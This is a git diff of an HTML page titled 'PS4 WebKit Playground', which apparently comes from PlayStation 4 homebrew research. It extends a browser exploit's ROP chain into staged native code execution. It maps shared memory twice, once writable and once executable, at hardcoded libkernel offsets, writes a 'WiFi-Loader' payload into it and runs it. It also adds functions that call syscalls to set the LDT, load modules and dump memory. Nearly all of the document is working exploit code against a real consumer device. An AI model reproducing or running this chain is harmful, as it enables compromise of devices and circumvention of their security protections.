@@ -10,11 +10,177 @@
 		<script type="text/javascript" src="js/network.js"></script>
 		<script type="text/javascript" src="js/just-rop.js"></script>
 		<script type="text/javascript" src="js/gadgets.js"></script>
+		<script type="text/javascript" src="js/code.js"></script>
 		<script type="text/javascript">
 function load() {
 	document.getElementById("environment").innerHTML = getEnvironmentInfo();
 	exploit();
 	chain = new rop();
+	
+	var codeExecutionStage = getCookie("codeExecutionStage");
+	if(codeExecutionStage == "1") {
+		allocateSharedMemory();
+		document.getElementById("codeExecutionStage").innerHTML = "Stage: Mapping shared memory...";
+		setTimeout(function() { document.cookie = "codeExecutionStage=2"; location.reload(); }, 10);
+	}
+	else if(codeExecutionStage == "2") {
+		mapSharedMemory();
+		document.getElementById("codeExecutionStage").innerHTML = "Stage: Waiting for payload...";
+		setTimeout(function() { document.cookie = "codeExecutionStage=3"; location.reload(); }, 10);
+	}
+	else if(codeExecutionStage == "3") {
+		payload();
+		document.getElementById("codeExecutionStage").innerHTML = "Stage: Executing...";
+		setTimeout(function() { document.cookie = "codeExecutionStage=4"; location.reload(); }, 10);
+	}
+	else if(codeExecutionStage == "4") {
+		copy();
+		document.getElementById("codeExecutionStage").innerHTML = "Stage: Done!";
+		setTimeout(function() { document.cookie = "codeExecutionStage=0"; location.reload(); }, 10);
+	}
+}
+
+var SECTIONSIZE = 1024 * 1024;
+
+function allocateSharedMemory() {
+	chain.call("createSharedMemory", LIBKERNEL, 0x15170, 0, SECTIONSIZE, 1 | 2 | 4, chain.data);
+	chain.call("createSharedMemoryAlias", LIBKERNEL, 0x151c0, 0x52, 1 | 2, chain.data + 8);
+	chain.syscall("mmap", 477, 0x926300000, SECTIONSIZE * 2, 1 | 2, 4096, -1, 0);
+	chain.write_rax_ToVariable(0);
+	
+	chain.execute(function() {
+		var dataAddress = chain.getVariable(0);
+		
+		logAdd("0x" + getU64from(chain.data).toString(16)); // 0x52
+		logAdd("0x" + getU64from(chain.data + 8).toString(16)); // 0x53
+		logAdd("Data address: 0x" + dataAddress.toString(16)); // 0x926300000
+		
+		logAdd("<h1>Refresh page and run Stage 2</h1>");
+	});
+}
+
+function mapSharedMemory() {
+	chain.call("mapSharedMemory", LIBKERNEL, 0x15210, 0x53, 1 | 2, chain.data);
+	chain.syscall("mmap", 477, 0x926100000 + SECTIONSIZE, SECTIONSIZE, 1 | 4, 1, 0x52, 0);
+	chain.write_rax_ToVariable(0);
+	
+	chain.execute(function() {
+		var writeAddress = getU64from(chain.data); // 0x926100000
+		var executeAddress = chain.getVariable(0); // 0x926200000 (0x926100000 + SECTIONSIZE)
+		
+		logAdd("Write address: 0x" + writeAddress.toString(16));
+		logAdd("Execute address: 0x" + executeAddress.toString(16));
+		
+		logAdd("<h1>Refresh page and run Stage 3</h1>");
+	});
+}
+
+function payload() {
+	var writeAddress = 0x926100000;
+	var executeAddress = 0x926200000;
+	
+	// infinite loop
+	//setU32to(writeAddress, 0xfeeb);
+	
+	// return
+	//setU32to(writeAddress, 0xc3);
+	
+	// mini loop
+	//setU32to(writeAddress + 0 * 4, 0x48c03148);
+	//setU32to(writeAddress + 1 * 4, 0x4801e883);
+	//setU32to(writeAddress + 2 * 4, 0xf775c085);
+	//setU32to(writeAddress + 3 * 4, 0x000000c3);
+	
+	// WiFi-Loader
+	writeLoader(writeAddress);
+	
+	chain.start(executeAddress);
+	chain.write_rax_ToVariable(0);
+	
+	chain.execute(function() {
+		chain.logVariable(0);
+		
+		logAdd("<h1>Refresh page and run Stage 4</h1>");
+	});
+}
+
+function copy() {
+	var writeAddress = 0x926100000;
+	var executeAddress = 0x926200000;
+	var dataAddress = 0x926300000;
+	
+	// Copy code
+	var c = [];
+	
+	setBase(dataAddress);
+	for(i = 0; i < SECTIONSIZE / 4; i++) c[i] = u32[i];
+	
+	setBase(writeAddress);
+	for(i = 0; i < SECTIONSIZE / 4; i++) u32[i] = c[i];
+	
+	// Copy data
+	var d = [];
+	
+	setBase(dataAddress + SECTIONSIZE);
+	for(i = 0; i < SECTIONSIZE / 4; i++) d[i] = u32[i];
+	
+	setBase(dataAddress);
+	for(i = 0; i < SECTIONSIZE / 4; i++) u32[i] = d[i];
+	
+	// Kill all elements in body
+	var body = document.getElementsByTagName("body")[0];
+	
+	//while(body.firstChild) {
+	//	body.removeChild(body.firstChild);
+	//}
+	
+	// Hide cursor
+	document.body.style.cursor = "none";
+	
+	// Create canvas
+	var canvas = document.createElement("canvas");
+	
+	canvas.id = "canvas";
+	canvas.width = 160;
+	canvas.height = 144;
+	canvas.style.zIndex = 1;
+	canvas.style.position = "absolute";
+	canvas.style.border = "1px solid";
+	
+	// Centered
+	//canvas.style.left = ((window.screen.width - canvas.width) / 2).toString() + "px";
+	//canvas.style.top = ((window.screen.height - canvas.height) / 2).toString() + "px";
+	
+	// Fullscreen
+	canvas.style.left = "0px";
+	canvas.style.top = "0px";
+	canvas.style.width = "100%";
+	canvas.style.height = "100%";
+	
+	//body.appendChild(canvas);
+	
+	// Create a framebuffer, and put some data in so we can find it
+	window.context = canvas.getContext("2d");
+	
+	context.fillStyle = "#c2c2c2";
+	context.fillRect(0, 0, canvas.width, canvas.height);
+	
+	window.framebuffer = context.getImageData(0, 0, canvas.width, canvas.height);
+	
+	setInterval(function() {
+		context.putImageData(framebuffer, 0, 0);
+	}, 1000 / 60); // try for 60 FPS
+	
+	// Execute
+	chain.start(executeAddress);
+	chain.write_rax_ToVariable(0);
+	
+	chain.execute(function() {
+		chain.logVariable(0);
+		
+		setBase(dataAddress);
+		logAdd(hexDump(dataAddress, 256));
+	});
 }
 
 function getpid() {
@@ -35,6 +201,45 @@ function getlogin() {
 		
 		logAdd("Name: " + name);
 		logAdd("Leaked pointer: 0x" + pointer.toString(16));
+	});
+}
+
+function setLDT() {
+	setU32to(chain.data + 0, 0xffffffff);
+	setU64to(chain.data + 4, chain.data + 64);
+	setU32to(chain.data + 12, 1);
+	
+	setU8to(chain.data + 64 + 0, 0xff);
+	setU8to(chain.data + 64 + 1, 0xff);
+	setU8to(chain.data + 64 + 2, 0x00);
+	setU8to(chain.data + 64 + 3, 0x00);
+	setU8to(chain.data + 64 + 4, 0x00);
+	setU8to(chain.data + 64 + 5, 0x73);
+	setU8to(chain.data + 64 + 6, 0xcf);
+	setU8to(chain.data + 64 + 7, 0x00);
+	setU8to(chain.data + 64 + 8, 0x00);
+	setU8to(chain.data + 64 + 9, 0x00);
+	setU8to(chain.data + 64 + 10, 0x00);
+	setU8to(chain.data + 64 + 11, 0x00);
+	setU8to(chain.data + 64 + 12, 0x00);
+	setU8to(chain.data + 64 + 13, 0x00);
+	setU8to(chain.data + 64 + 14, 0x00);
+	setU8to(chain.data + 64 + 15, 0x00);
+	
+	chain.syscall("sysarch", 165, 1, chain.data);
+	chain.write_rax_ToVariable(0);
+	
+	chain.execute(function() {
+		chain.logVariable(0);
+	});
+}
+
+function getThread() {
+	chain.call("getThread", LIBKERNEL, 0x128F0);
+	chain.write_rax_ToVariable(0);
+	
+	chain.execute(function() {
+		chain.logVariable(0);
 	});
 }
 
@@ -87,7 +292,8 @@ function readModule() {
 		var moduleSize = codeSize + dataSize;
 		
 		logAdd("Name: " + moduleName);
-		logAdd("Size: " + moduleSize / 1024 + "KB");
+		logAdd("Base: 0x" + moduleBase.toString(16));
+		logAdd("Size: " + (moduleSize / 1024).toString() + "KB");
 	});
 }
 
@@ -164,6 +370,26 @@ function loadModule() {
 	});
 }
 
+function loadNamedModule() {
+	var moduleName = document.getElementById("moduleName").value;
+	
+	if(!moduleName) {
+		logAdd("Enter a module name");
+		document.getElementById("moduleName").focus();
+		return;
+	}
+	
+	writeString(chain.data, moduleName);
+	chain.syscall("loadModule", 594, chain.data, 0, chain.data + 0x20, 0);
+	chain.write_rax_ToVariable(0);
+	
+	chain.execute(function() {
+		chain.logVariable(0);
+		logAdd("Loaded with ID: " + getU32from(chain.data + 0x20));
+		logAdd("Refresh the page and use Read Loaded Module");
+	});
+}
+
 function getPSN() {
 	var path = chain.data;
 	var contents = chain.data;
@@ -213,12 +439,20 @@ function getStackProtection() {
 function getStackName() {
 	var info = chain.data;
 	
-	chain.syscall("getOtherMemoryInfo", 572, stack_base, 0, info, 0x40);
+	//chain.syscall("getOtherMemoryInfo", 572, stack_base, 0, info, 0x40);
+	chain.syscall("getOtherMemoryInfo", 572, 0, 1, info, 0x40);
 	
 	chain.execute(function() {
 		var base = getU64from(info + 0x0);
 		var size = getU64from(info + 0x8) - base;
 		var name = readString(info + 0x20);
+		
+		//setU16to(base + 0x4000, 0xfeeb);
+		setBase(base);
+		logAdd(hexDump(base, 16));
+		
+		setBase(base + 0x4000);
+		logAdd(hexDump(base + 0x4000, 16));
 		
 		logAdd("Stack base: 0x" + base.toString(16));
 		logAdd("Stack size: 0x" + size.toString(16));
@@ -261,7 +495,7 @@ function socketSend() {
 	<body onload="load()">
 		<div class="header">
 			<h1>PS4 WebKit Playground</h1>
-			<h2>CTurt, SKFU, droogie, Xerpi, Hunger, Takezo, nas, Proxima</h2>
+			<h2>CTurt, flatz, SKFU, droogie, Xerpi, Hunger, Takezo, nas, Proxima</h2>
 			
 			<div id="environment"></div>
 		</div>
@@ -269,6 +503,31 @@ function socketSend() {
 		<hr>
 		
 		<div class="box-container">
+			<div class="box">
+				<h2>Server</h2>
+				<div>
+					IP:
+					<input type="text" value="192.168.0.4" id="hostAddr" /><br>
+					<br>
+					
+					Port:
+					<input type="number" value="9023" id="hostPort" /><br>
+					<br>
+				</div>
+			</div>
+			
+			<div class="box">
+				<h2>Code execution</h2>
+				
+				<div>
+					<h3 id="codeExecutionStage">Stage: [Not started]</h3>
+					
+					<div>
+						<button onclick='allocateSharedMemory(); setTimeout(function() { document.cookie = "codeExecutionStage=2"; location.reload(); }, 1000);'>Go</button>
+					</div>
+				</div>
+			</div>
+			
 			<div class="box">
 				<h2>Syscalls</h2>
 				
@@ -280,6 +539,18 @@ function socketSend() {
 				
 				<div>
 					<button onclick="getlogin()">Get Login</button>
+				</div>
+				
+				<br>
+				
+				<div>
+					<button onclick="setLDT()">Set LDT</button>
+				</div>
+				
+				<br>
+				
+				<div>
+					<button onclick="getThread()">Get Thread</button>
 				</div>
 			</div>
 						
@@ -315,60 +586,62 @@ function socketSend() {
 					<button onclick="getStackName()">Get Stack Name</button>
 				</div>
 			</div>
+				
+			<div class="box">
+				<h2>Sockets</h2>
+				<div>
+					Message:
+					<input type="text" size="50" value="Hello from your PlayStation 4 :)" id="socketMessage" /><br>
+					<br>
+					
+					<button onclick="socketSend()">Send Message</button>
+				</div>
+			</div>
 			
 			<div class="box">
-				<h2>Server</h2>
+				<h2>Modules</h2>
+				
 				<div>
-					IP:
-					<input type="text" value="192.168.0.4" id="hostAddr" /><br>
-					<br>
-					
-					Port:
-					<input type="number" value="9023" id="hostPort" /><br>
-					<br>
+					<button onclick="getLoadedModules()">Get Loaded Modules</button>
 				</div>
 				
-				<div class="box">
-					<h2>Sockets</h2>
-					<div>
-						Message:
-						<input type="text" size="50" value="Hello from your PlayStation 4 :)" id="socketMessage" /><br>
-						<br>
-						
-						<button onclick="socketSend()">Send Message</button>
-					</div>
+				<br>
+				
+				<div>
+					Loaded Module ID (Get Loaded Modules):
+					<input type="number" id="loadedModuleID" />
+					<button onclick="readModule()">Read Loaded Module</button>
 				</div>
 				
-				<div class="box">
-					<h2>Modules</h2>
-					
-					<div>
-						<button onclick="getLoadedModules()">Get Loaded Modules</button>
-					</div>
-					
-					<br>
-					
-					<div>
-						Loaded Module ID (Get Loaded Modules):
-						<input type="number" id="loadedModuleID" />
-						<button onclick="readModule()">Read Loaded Module</button>
-					</div>
-					
-					<br>
-					
-					<div>
-						Loaded Module Index (Get Loaded Modules):
-						<input type="number" id="loadedModuleIndex" />
-						<button onclick="dumpModule()">Dump Loaded Module</button>
-					</div>
-					
-					<br>
-					
-					<div>
-						Module ID (<a href="http://www.ps3devwiki.com/ps4/Libraries#Libraries_on_firmware_1.76">check this list</a>):
-						<input type="number" id="moduleID" />
-						<button onclick="loadModule()">Load Module</button>
-					</div>
+				<br>
+				
+				<div>
+					Loaded Module Index (Get Loaded Modules):
+					<input type="number" id="loadedModuleIndex" />
+					<button onclick="dumpModule()">Dump Loaded Module</button>
+				</div>
+				
+				<br>
+				
+				<div>
+					Module ID (<a href="http://www.ps3devwiki.com/ps4/Libraries#Libraries_on_firmware_1.76">check this list</a>):
+					<input type="number" id="moduleID" />
+					<button onclick="loadModule()">Load Module</button>
+				</div>
+				
+				<br>
+				
+				<div>
+					Module name (<a href="http://www.ps3devwiki.com/ps4/Libraries#Libraries_on_firmware_1.76">check this list</a>):
+					<input type="text" id="moduleName" value="libSceGnmDriver.sprx" />
+					<button onclick="loadNamedModule()">Load Module</button>
+				</div>
+			</div>
+			
+			<div class="box">
+				<h2>Misc</h2>
+				<div>
+					<button onclick="location.reload()">Refresh</button>
 				</div>
 			</div>
 		</div>
